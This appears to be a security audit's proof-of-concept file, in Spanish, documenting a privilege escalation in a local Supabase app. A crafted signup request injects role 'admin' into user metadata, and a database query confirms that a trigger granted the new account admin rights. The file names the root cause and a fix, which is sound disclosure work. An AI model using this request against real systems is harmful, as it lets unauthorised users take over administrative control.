@@ -1,0 +1,53 @@
+AUTH-POC-1 — Escalamiento de privilegios en el registro (role controlado por el cliente)
+Entorno: Supabase local (http://127.0.0.1:54321). Fecha: 2026-10-21.
+Tokens y apikey redactados; es un entorno local de prueba.
+
+========================================================================
+1) ATAQUE — signup directo contra GoTrue con role inyectado en `data`
+========================================================================
+$ curl -s -X POST "http://127.0.0.1:54321/auth/v1/signup" \
+    -H "apikey: <ANON/PUBLISHABLE_KEY_REDACTED>" \
+    -H "Content-Type: application/json" \
+    -d '{"email":"attacker-escalation@poc.local","password":"<REDACTED>",
+         "data":{"full_name":"Mallory","role":"admin"}}'
+
+Respuesta (extracto, tokens redactados):
+{
+  "access_token": "<REDACTED_JWT>",
+  "refresh_token": "<REDACTED>",
+  "user": {
+    "id": "2d163317-9c96-4586-b358-e9a1fed1869a",
+    "email": "attacker-escalation@poc.local",
+    "role": "authenticated",                      <-- rol de Postgres (claim top-level)
+    "user_metadata": {
+      "full_name": "Mallory",
+      "role": "admin"                             <-- ⚠️ rol inyectado por el atacante
+    }
+  }
+}
+
+========================================================================
+2) VERIFICACIÓN — el trigger handle_new_user() asignó role=admin
+========================================================================
+$ psql -c "select u.email, ur.role
+           from public.user_roles ur
+           join auth.users u on u.id = ur.user_id
+           where u.email = 'attacker-escalation@poc.local';"
+
+ attacker-escalation@poc.local | admin          <-- esperado: client
+
+Comparación con los admins legítimos del seed:
+             email             | role
+-------------------------------+-------
+ owner@hotel.local             | owner
+ admin@hotel.local             | admin
+ newadmin@hotel.local          | admin
+ manager@hotel.local           | admin
+ attacker-escalation@poc.local | admin          <-- cuenta pública auto-registrada
+
+========================================================================
+RESULTADO: una cuenta creada por registro público, sin invitación ni
+aprobación, queda con rol de negocio `admin` en public.user_roles —
+la misma fuente que leen verifyAdminRole / las comprobaciones de permisos.
+Escalamiento vertical confirmado (A01). Causa raíz: handle_new_user()
+toma el rol de raw_user_meta_data (editable por el cliente). Fix: P3.1.
